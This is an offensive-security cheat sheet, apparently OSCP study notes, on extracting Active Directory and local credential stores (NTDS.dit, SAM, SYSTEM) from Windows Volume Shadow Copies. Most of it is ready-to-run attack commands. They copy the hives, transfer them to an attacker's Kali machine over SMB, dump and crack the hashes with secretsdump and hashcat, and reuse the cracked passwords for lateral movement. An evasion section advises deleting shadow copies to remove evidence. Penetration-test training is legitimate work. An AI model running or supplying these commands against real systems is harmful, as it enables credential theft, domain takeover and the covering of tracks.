---
tags:
  - Windows
  - Credential_Access
  - Active_Directory
  - NTDS
  - Advanced
---

## Shadow Copies Extraction
resources: [HackTricks Shadow Copies](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#shadow-copies), [PayloadsAllTheThings NTDS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ntdsdit)

> Extract sensitive files (NTDS.dit, SAM, SYSTEM) from Volume Shadow Copies on Windows systems.

## What are Shadow Copies?

> [!info] Volume Shadow Copy Service (VSS) creates point-in-time snapshots of volumes.
> - Used for backup and restore operations
> - Often contains copies of sensitive files (NTDS.dit, SAM, SYSTEM)
> - Requires local administrator privileges to access
> - Can be used to extract credentials even if files are locked

## Enumerate Shadow Copies

### List Shadow Copies with vssadmin
```powershell
vssadmin list shadows
```

**Example Output:**
```text
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
   Original Volume: (C:)
   Shadow Copy ID: {12345678-1234-1234-1234-123456789012}
   Creation Time: 1/15/2024 3:45:23 PM
```

### List Shadow Copies with WMI
```powershell
Get-WmiObject Win32_ShadowCopy | Select-Object DeviceObject, InstallDate
```

### List Shadow Copies with PowerShell
```powershell
Get-CimInstance Win32_ShadowCopy
```

## Create Shadow Copy

> [!warning] Creating shadow copies requires administrator privileges and may be logged.

### Create Shadow Copy with vssadmin
```powershell
vssadmin create shadow /for=C:
```

### Create Shadow Copy with WMI
```powershell
(Get-WmiObject -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
```

### Create Shadow Copy with PowerShell
```powershell
Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'}
```

## Extract NTDS.dit from Shadow Copy

> [!important] NTDS.dit contains all Active Directory credentials (domain controller only).

### Method 1: Copy from Shadow Copy Path
```powershell
# List shadow copies to find the path
vssadmin list shadows

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

# Copy SYSTEM registry hive (needed for decryption)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Method 2: Using mklink (Symbolic Link)
```powershell
# Create symbolic link to shadow copy
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# Copy files
copy C:\ShadowCopy\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy C:\ShadowCopy\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Remove symbolic link
rmdir C:\ShadowCopy
```

### Method 3: Using robocopy
```powershell
robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS C:\Temp ntds.dit
robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config C:\Temp SYSTEM
```

## Extract SAM and SYSTEM from Shadow Copy

> [!tip] SAM contains local user password hashes.

### Copy SAM and SYSTEM
```powershell
# List shadow copies
vssadmin list shadows

# Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM

# Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Copy SECURITY (optional, contains cached credentials)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY
```

## Automated Extraction with Impacket

### secretsdump.py with VSS
```bash
impacket-secretsdump -use-vss <Domain>/<Username>:'<Password>'@<DomainController>
```

> [!tip] Automatically creates shadow copy, extracts NTDS.dit, and dumps hashes.

### secretsdump.py with Specific User
```bash
impacket-secretsdump -use-vss -just-dc-user <TargetUser> <Domain>/<Username>:'<Password>'@<DomainController>
```

### secretsdump.py with NTLM Hash
```bash
impacket-secretsdump -use-vss -hashes :<NTLMHash> <Domain>/<Username>@<DomainController>
```

## Automated Extraction with NetExec

### Dump NTDS.dit with VSS Method
```bash
nxc smb <DomainController> -u <Username> -p '<Password>' --ntds vss
```

### Dump NTDS.dit with DRSUAPI Method
```bash
nxc smb <DomainController> -u <Username> -p '<Password>' --ntds drsuapi
```

> [!info] DRSUAPI is stealthier but requires Domain Admin or equivalent.

## Extract Credentials from Offline Files

### Extract NTDS.dit Hashes with secretsdump.py
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Example:**
```bash
# After copying files to Kali
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_hashes.txt
```

### Extract SAM Hashes with secretsdump.py
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Extract with Impacket (All Hives)
```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Manual Shadow Copy Workflow

### Step 1: Create Shadow Copy
```powershell
vssadmin create shadow /for=C:
```

### Step 2: Identify Shadow Copy Path
```powershell
vssadmin list shadows
```

**Note the DeviceObject path:** `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`

### Step 3: Copy NTDS.dit and SYSTEM
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Step 4: Transfer Files to Kali
```powershell
# On Windows (start SMB server on Kali first)
copy C:\Temp\ntds.dit \\<KaliIP>\share\ntds.dit
copy C:\Temp\SYSTEM \\<KaliIP>\share\SYSTEM
```

```bash
# On Kali (start SMB server)
impacket-smbserver share . -smb2support
```

### Step 5: Extract Hashes on Kali
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_hashes.txt
```

### Step 6: Crack Hashes
```bash
# Extract NTLM hashes only
cat domain_hashes.txt | cut -d: -f4 > ntlm_hashes.txt

# Crack with Hashcat
hashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Delete Shadow Copies (Cleanup)

### Delete All Shadow Copies
```powershell
vssadmin delete shadows /all /quiet
```

### Delete Specific Shadow Copy
```powershell
vssadmin delete shadows /shadow={ShadowCopyID} /quiet
```

### Delete Oldest Shadow Copy
```powershell
vssadmin delete shadows /for=C: /oldest /quiet
```

## Alternative Tools

### diskshadow.exe (Built-in Windows Tool)
```powershell
# Create script file
echo "set context persistent nowriters" > diskshadow.txt
echo "add volume C: alias mydisk" >> diskshadow.txt
echo "create" >> diskshadow.txt
echo "expose %mydisk% Z:" >> diskshadow.txt

# Execute script
diskshadow /s diskshadow.txt

# Copy files from Z: drive
copy Z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy Z:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Cleanup
echo "unexpose Z:" > cleanup.txt
diskshadow /s cleanup.txt
```

### esentutl.exe (Repair NTDS.dit)
```powershell
# If NTDS.dit is corrupted
esentutl /p /o ntds.dit
```

> [!warning] Only use if secretsdump fails due to corruption.

## PowerShell One-Liner

### Extract NTDS.dit in One Command
```powershell
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible'); $device = (Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }).DeviceObject; cmd /c copy "$device\Windows\NTDS\ntds.dit" C:\Temp\ntds.dit; cmd /c copy "$device\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
```

### Extract SAM in One Command
```powershell
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible'); $device = (Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }).DeviceObject; cmd /c copy "$device\Windows\System32\config\SAM" C:\Temp\SAM; cmd /c copy "$device\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
```

## Detection and Evasion

> [!warning] Shadow copy operations are often logged and monitored.

### Event IDs to Watch
- **Event ID 7036**: VSS service started/stopped
- **Event ID 8222**: Shadow copy created
- **Event ID 8224**: Shadow copy deleted

### Evasion Tips
1. **Use existing shadow copies** - Don't create new ones
2. **Delete shadow copies after use** - Clean up evidence
3. **Use DRSUAPI instead** - More stealthy for NTDS.dit extraction
4. **Avoid vssadmin** - Use WMI or PowerShell instead (less obvious)

## Troubleshooting

### "Access Denied" Error
> [!warning] Requires local administrator or SYSTEM privileges.

**Solution:**
```powershell
# Check privileges
whoami /priv

# Ensure you have SeBackupPrivilege
```

### "Shadow Copy Not Found" Error
```powershell
# Verify shadow copies exist
vssadmin list shadows

# Create new shadow copy if needed
vssadmin create shadow /for=C:
```

### "File is in use" Error
> [!info] This is why we use shadow copies - to access locked files.

**Solution:**
- Ensure you're copying from the shadow copy path, not the live filesystem
- Verify the shadow copy path is correct

### secretsdump.py Fails
```bash
# Check file integrity
file ntds.dit
# Should show: "Extensible storage engine DataBase"

# Try repairing with esentutl (on Windows)
esentutl /p /o ntds.dit
```

## OSCP Exam Tips

> [!important] Shadow copies are critical for extracting NTDS.dit on domain controllers.

**Time Estimate:** 10-15 minutes for complete NTDS.dit extraction and hash dumping

**Quick Wins:**
1. **Use impacket-secretsdump with -use-vss** - Fully automated
2. **Check for existing shadow copies first** - No need to create new ones
3. **Extract SYSTEM hive** - Required for decrypting NTDS.dit
4. **Use NetExec for speed** - `nxc smb DC --ntds vss`

**Common Mistakes:**
- Forgetting to copy SYSTEM registry hive
- Using wrong shadow copy path (check with `vssadmin list shadows`)
- Not transferring files to Kali before extraction
- Trying to open NTDS.dit directly (must use secretsdump)

**Pro Tips:**
- Always copy both NTDS.dit AND SYSTEM hive
- Use `-just-dc-user Administrator` to extract specific users faster
- Save all hashes to file for offline cracking
- Delete shadow copies after extraction to clean up
- If you have DA, use DRSUAPI method instead (stealthier)

## Complete Attack Chain

```bash
# On Kali - Automated method (recommended)
impacket-secretsdump -use-vss corp.local/Administrator:'Password123!'@192.168.1.10 > domain_hashes.txt

# Extract NTLM hashes
cat domain_hashes.txt | grep ':::' | cut -d: -f4 > ntlm.txt

# Crack hashes
hashcat -a 0 -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# Use cracked credentials for lateral movement
nxc smb 192.168.1.0/24 -u Administrator -p 'CrackedPassword123!'
```

> [!tip] This workflow goes from domain controller access to full domain compromise in minutes.
